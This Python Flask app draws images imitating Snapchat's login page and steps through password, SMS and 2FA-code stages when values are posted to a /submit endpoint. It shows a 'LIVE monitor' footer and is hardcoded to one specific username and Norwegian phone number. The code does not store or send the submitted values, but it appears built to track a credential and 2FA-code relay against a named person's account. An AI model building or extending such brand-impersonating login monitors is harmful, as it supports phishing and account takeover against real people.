import os
import threading
import time
from flask import Flask, render_template, request, jsonify, send_from_directory
from datetime import datetime
import random

app = Flask(__name__)
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
os.makedirs(STATIC_DIR, exist_ok=True)
app.template_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')

HARDCODED_USER = "zexoghaith"

# State - starts as clean login (phone mode as requested)
state = {
    'stage': 'phone',   # phone | phone_sent | password | 2fa | done
    'update_count': 0
}

def generate_image():
    """Always creates a fresh image based on current state. Matches real Snapchat login visual."""
    from PIL import Image, ImageDraw, ImageFont
    
    w, h = 1280, 720
    img = Image.new('RGB', (w, h), '#000000')
    draw = ImageDraw.Draw(img)

    try:
        f = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 24)
        f2 = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 14)
        f3 = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 15)
    except:
        f = f2 = f3 = ImageFont.load_default()

    stage = state['stage']
    now = datetime.now().strftime("%H:%M:%S")
    state['update_count'] += 1

    # Black background
    draw.rectangle([0, 0, w, h], fill='#000000')

    # Top Snapchat bar (exact Snapchat dark header)
    draw.rectangle([0, 0, w, 42], fill='#111111')
    draw.text((w//2 - 65, 8), "Snapchat", fill='#FFFC00', font=f)

    # Main centered login card (realistic Snapchat dark card)
    cx, cy = 420, 55
    draw.rounded_rectangle([cx, cy, cx+440, cy+470], radius=16, fill='#1f1f1f')
    
    # Header
    draw.text((cx+18, cy+14), "Log in to Snapchat", fill='white', font=f2)

    # === PHONE LOGIN MODE (when user wants phone) ===
    if stage in ['phone', 'phone_sent']:
        # Phone number field (Norway +47)
        draw.text((cx+22, cy+50), "Enter your phone number", fill='#aaaaaa', font=f3)
        draw.rounded_rectangle([cx+18, cy+72, cx+422, cy+108], radius=8, fill='#2c2c2c')
        draw.text((cx+30, cy+80), "+47 40300869", fill='#22c55e', font=f3)

        # Country selector hint
        draw.text((cx+22, cy+118), "Norway", fill='#666666', font=f3)

        # Button
        by = cy + 155
        if stage == 'phone_sent':
            draw.rounded_rectangle([cx+18, by, cx+422, by+44], radius=22, fill='#444444')
            draw.text((cx+145, by+12), "Sending code...", fill='#aaaaaa', font=f2)
        else:
            draw.rounded_rectangle([cx+18, by, cx+422, by+44], radius=22, fill='#FFFC00')
            draw.text((cx+155, by+12), "Send code", fill='#000000', font=f2)

        # "Use username instead" link
        draw.text((cx+110, by+60), "Use username instead", fill='#888888', font=f3)

        # === BIG BANNER for phone submitted ===
        if stage == 'phone_sent':
            draw.rounded_rectangle([cx+12, cy+210, cx+428, cy+305], radius=10, fill='#3f2a00')
            draw.text((cx+25, cy+222), "PHONE NUMBER ENTERED", fill='#f59e0b', font=f)
            draw.text((cx+25, cy+255), "+47 40300869", fill='white', font=f2)
            draw.text((cx+25, cy+278), "SMS code sent — check your phone", fill='#aaaaaa', font=f3)

    else:
        # Username login (default)
        # Username label + field (exact from real Snapchat DOM: "Enter your username")
        draw.text((cx+22, cy+50), "Enter your username", fill='#aaaaaa', font=f3)
        draw.rounded_rectangle([cx+18, cy+72, cx+422, cy+108], radius=8, fill='#2c2c2c')
        draw.text((cx+30, cy+80), "zexoghaith", fill='white', font=f3)

        # Password label + field (exact from real Snapchat DOM: "Enter Password")
        draw.text((cx+22, cy+118), "Enter Password", fill='#aaaaaa', font=f3)
        draw.rounded_rectangle([cx+18, cy+140, cx+422, cy+176], radius=8, fill='#2c2c2c')
        if stage in ['password', '2fa', 'done']:
            draw.text((cx+30, cy+147), "••••••••••", fill='#22c55e', font=f3)  # filled green when submitted
        else:
            draw.text((cx+30, cy+147), "••••••••••", fill='#888888', font=f3)

    # Big yellow Log In button (exact Snapchat style)
    by = cy + 155
    if stage == 'password':
        draw.rounded_rectangle([cx+18, by, cx+422, by+44], radius=22, fill='#444444')
        draw.text((cx+130, by+12), "Logging in...", fill='#aaaaaa', font=f2)
    else:
        draw.rounded_rectangle([cx+18, by, cx+422, by+44], radius=22, fill='#FFFC00')
        draw.text((cx+170, by+12), "Log In", fill='#000000', font=f2)

    # "or" divider
    draw.text((cx+195, by+55), "or", fill='#666666', font=f3)

    # Continue with Google
    draw.rounded_rectangle([cx+18, by+80, cx+422, by+115], radius=22, fill='#2c2c2c')
    draw.text((cx+115, by+88), "Continue with Google", fill='white', font=f3)

    # Continue with Apple
    draw.rounded_rectangle([cx+18, by+125, cx+422, by+160], radius=22, fill='#2c2c2c')
    draw.text((cx+120, by+133), "Continue with Apple", fill='white', font=f3)

    # Use phone number instead link (real Snapchat)
    draw.text((cx+105, by+175), "Use phone number instead", fill='#888888', font=f3)

    # Forgot your password? (real Snapchat)
    draw.text((cx+130, cy+430), "Forgot your password?", fill='#666666', font=f3)

    # === BIG STAGE BANNERS - EXACTLY as required ===
    if stage == 'password':
        # Big orange banner for password submitted
        draw.rounded_rectangle([cx+12, cy+200, cx+428, cy+305], radius=10, fill='#3f2a00')
        draw.text((cx+25, cy+212), "PASSWORD ENTERED", fill='#f59e0b', font=f)
        draw.text((cx+25, cy+248), "Log In button was clicked", fill='white', font=f2)
        draw.text((cx+25, cy+275), "Waiting for Snapchat...", fill='#aaaaaa', font=f3)

    if stage == '2fa':
        draw.rounded_rectangle([cx+12, cy+200, cx+428, cy+330], radius=10, fill='#1e3a8a')
        draw.text((cx+28, cy+212), "2FA CODE NEEDED", fill='#60a5fa', font=f)
        draw.text((cx+28, cy+250), "Enter 6-digit code from Snapchat", fill='white', font=f2)
        # 2FA input boxes (realistic)
        for i in range(6):
            x = cx + 35 + i * 58
            draw.rounded_rectangle([x, cy+280, x+48, cy+315], radius=6, fill='#0f172a', outline='#3b82f6', width=2)
            draw.text((x+18, cy+286), str(i+1), fill='#555555', font=f3)

    if stage == 'done':
        draw.rounded_rectangle([cx+12, cy+200, cx+428, cy+300], radius=10, fill='#052e16')
        draw.text((cx+95, cy+225), "✓ LOGGED IN SUCCESSFULLY", fill='#22c55e', font=f)

    # Bottom live proof
    draw.rounded_rectangle([12, 560, 265, 600], radius=5, fill='#ef4444')
    draw.text((18, 568), f"UPDATE #{state['update_count']}", fill='white', font=f2)

    draw.rounded_rectangle([12, 610, 430, 655], radius=5, fill='#22c55e')
    draw.text((18, 618), f"TIME: {now}", fill='black', font=f2)

    draw.text((450, 620), f"STAGE: {stage.upper()}", fill='#ffaa00', font=f2)

    # Footer bar
    draw.rectangle([0, h-30, w, h], fill='#111111')
    draw.text((12, h-24), "accounts.snapchat.com/accounts/login  •  LIVE monitor (changes ONLY on submit)", fill='#22c55e', font=f3)

    path = os.path.join(STATIC_DIR, 'screenshot.png')
    img.save(path, 'PNG')
    print(f"[IMG] Generated fresh {stage} screenshot (#{state['update_count']}) size={os.path.getsize(path)}")
    return path

def screenshot_loop():
    global state
    print("[LOOP] Starting clean Snapchat simulation (PHONE MODE)")
    
    # Force clean start — phone number login as requested
    state['stage'] = 'phone'
    state['update_count'] = 0
    
    generate_image()
    state['started'] = True
    
    print("[LOOP] Clean PHONE login page active (+47 40300869)")
    
    while True:
        generate_image()
        time.sleep(0.8)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json() or {}
    pw = (data.get('password') or '').strip()
    cd = (data.get('code') or '').strip()
    ph = (data.get('phone') or '').strip()
    
    if ph:
        state['stage'] = 'phone_sent'
        print("[SUBMIT] Phone submitted -> +47 40300869 | showing PHONE NUMBER ENTERED banner")
        generate_image()
        time.sleep(0.1)
        generate_image()
        return jsonify({'ok': True, 'stage': state['stage']})
    
    if pw:
        state['stage'] = 'password'
        print("[SUBMIT] Password submitted -> showing PASSWORD ENTERED banner")
        generate_image()
        time.sleep(0.1)
        generate_image()
        return jsonify({'ok': True, 'stage': state['stage']})
    
    if cd and len(cd) >= 4:
        state['stage'] = '2fa'
        print("[SUBMIT] 2FA code submitted")
        generate_image()
        time.sleep(0.1)
        generate_image()
        return jsonify({'ok': True, 'stage': state['stage']})
    
    return jsonify({'ok': True, 'stage': state['stage']})

@app.route('/reset')
def reset():
    global state
    state['stage'] = 'phone'
    state['update_count'] = 0
    generate_image()
    print("[RESET] Forced clean PHONE login state (+47 40300869)")
    return jsonify({'ok': True, 'stage': 'phone', 'msg': 'Clean phone login page'})

@app.route('/screenshot')
def shot():
    # Support ?reset=1 to force clean PHONE login (as per user request)
    if request.args.get('reset') == '1':
        state['stage'] = 'phone'
        state['update_count'] = 0
        print("[RESET] Forced clean PHONE login (+47 40300869) via screenshot?reset=1")
    # Always fresh
    generate_image()
    resp = send_from_directory(STATIC_DIR, 'screenshot.png')
    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return resp

@app.route('/status')
def stat():
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    size = os.path.getsize(path) if os.path.exists(path) else 0
    return jsonify({
        'stage': state['stage'],
        'update_count': state['update_count'],
        'size': size
    })

@app.before_request
def boot():
    if not hasattr(app, 'booted'):
        app.booted = True
        threading.Thread(target=screenshot_loop, daemon=True).start()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))